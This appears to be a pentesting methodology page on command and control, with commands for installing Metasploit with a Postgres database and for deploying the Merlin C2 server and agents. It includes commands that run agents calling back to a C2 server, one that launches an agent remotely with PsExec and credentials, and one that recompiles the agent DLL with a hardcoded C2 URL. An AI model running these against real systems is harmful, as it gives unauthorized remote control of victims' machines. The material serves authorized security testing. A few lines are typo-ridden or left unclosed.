# Command and Control
[**Back** to Methodologies](/Methodology#methodologies)

*Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victimâ€™s network structure and defenses.*

# Metasploit
by RAPID7



## Installing Framework on Linux
```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```

## Running Metasploit
Start the framework with the following command:
```bash
msfconsole
```
While it is completely useable at this point, it becomes when you also connect the framework to a backend database.

## Setting Up locally hosted Database with authentication

Especially for extended campaigns, having everything organized and integrated directly into the framework will be required.

The following is copied from [This Guide](https://fedoraproject.org/wiki/Metasploit_Postgres_Setup) by the fedoraproject:
1. Allowing password authentication to access postgres on localhost
*Allow the possibility for account msf_user to use password based authentication to connect to databasse msf_user. Edit "/var/lib/pgsql/data/pg_hba.conf", change: *
```bash
host     all            all            127.0.0.1/32          ident
```
*to*
```bash
ost      "msf_database"	"msf_user"      127.0.0.1/32          md5
host     all             all            127.0.0.1/32          ident
```
2. Starting postgres
```bash
user@magnolia:$ sudo -s
user@magnolia:$ postgresql-setup initdb
user@magnolia:$ systemctl start postgresql.service
```
3. Becoming the postgres user
```bash
root@magnolia:# su postgres
```
4. Creating a database user
```bash
postgres@magnolia:$ createuser msf_user -P
Enter password for new role: yourmsfpassword
Enter it again: yourmsfpassword 
Shall the new role be a superuser? (y/n) n
Shall the new role be allowed to create databases? (y/n) n
Shall the new role be allowed to create more new roles? (y/n) n
```
5. Creating a database
```bash
postgres@magnolia:$ createdb --owner=msf_user msf_database
```
6. Configure Metasploit
```bash
root@magnolia:# msfconsole
msf > db_status 
[*] postgresql selected, no connection
msf> db_connect msf_user:yourmsfpassword@127.0.0.1:5432/msf_database
NOTICE:  CREATE TABLE will create implicit sequence "hosts_id_seq" for serial column "hosts.id"
NOTICE:  CREATE TABLE / PRIMARY KEY will create implicit index "hosts_pkey" for table "hosts"
[..]
NOTICE:  CREATE TABLE will create implicit sequence "mod_refs_id_seq" for serial column "mod_refs.id"
NOTICE:  CREATE TABLE / PRIMARY KEY will create implicit index "mod_refs_pkey" for table "mod_refs"
```
7. Enable the database on startup
*Write the database configuration to separate configuration file so the password doesn't get printed on the screen during each start of the msfconsole.Please not the attributes are prepended with spaces characters not tabs.*
```bash
$ cat > /opt/metasploit4/config/database.yml << EOF
production:
    adapter: postgresql
    database: msf_database
    username: msf_user
    password: yourmsfpassword
    host: 127.0.0.1
    port: 5432
    pool: 75
    timeout: 5
EOF
```
*Use the database configuration file and connect to this database during each startup of msfconsole. Also change to the workspace of yur current pentesting project.*
```bash
$ cat > ~/.msf4/msfconsole.rc << EOF
db_connect -y /opt/metasploit4/config/database.yml
workspace -a YourProject
EOF
```
8. Using the database
*Once you have database configured and connected you can use it to store information. First check the database status:*
```bash
msf > db_status
[*] postgresql connected to msf_database
```
*Scan the local network network:*
```bash
msf > db_nmap 192.168.1.0/24
```
*List hosts which are in the database:*
```bash
msf > hosts

Hosts

*List all the db commands for the version of metasploit you have installed:*
```bash
msf > help database

## Merlin Server

The following single line of code can be used to download, extract, and run Merlin Server on an Ubuntu Server:
```bash
sudo bash;apt update;apt install p7zip-full -y;cd /opt;wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z;7z x -pmerlin -omerlin merlinServer-Linux-x64.7z;cd merlin;./merlinServer-Linux-x64
```
## Merlin Agents

Pre-compiled Merlin Agent binary files are distributed with the server download in the data/bin/ directory of Merlin

Can also use GO to retrieve and build an Agent
```bash
go get github.com/Ne0nd0g/merlin-agent
```

### Upload and Execute

Unless recompiling binary, the hardcoded -url flag needs to be set to your C2 server url when executing. For these examples the C2 server ip is 192.168.1.100.



### Windows Local Execution

#### CMD.exe
```cmd
C:\Users\Bob\Downloads>merlinAgent.exe -url https://192.168.1.100:443/
```
#### rundll32.exe
```cmd
C:\Users\Bob\Downloads>C:\WINDOWS\System32\rundll32.exe merlin.dll,Run https://192.168.1.100:443/
```

### Windows Remote Execution

#### PsExec.exe
```cmd
PS C:\SysinternalsSuite>.\PsExec.exe \\192.168.1.10 -u bob -p password -d -c C:\merlin\data\bin\windows\merlinAgent.exe -url https://192.168.1.100:443/
```

### Recompiling DLL
The merlin.dll file can be configured with the hardcoded url of your Merlin server. To do this, clone the repo, modify the file, and recompile it.
```bash
cd /opt
git clone -b dev https://github.com/Ne0nd0g/merlin-agent-dll.git
cd merlin-agent-dll
sed -i 's_https://127.0.0.1:443/_https://192.168.1.100:443/_' main.go
make
```
Running dll with rundll32.exe
```cmd
rundll32.exe merlin,main
rundll32.exe merlin,Run
```
with regsvr32.exe
```cmd
regsvr32.exe /s merlin.dll
regsvr32.exe /s /u merlin.dll
regsvr32.exe /s /n /i merlin.dll
```
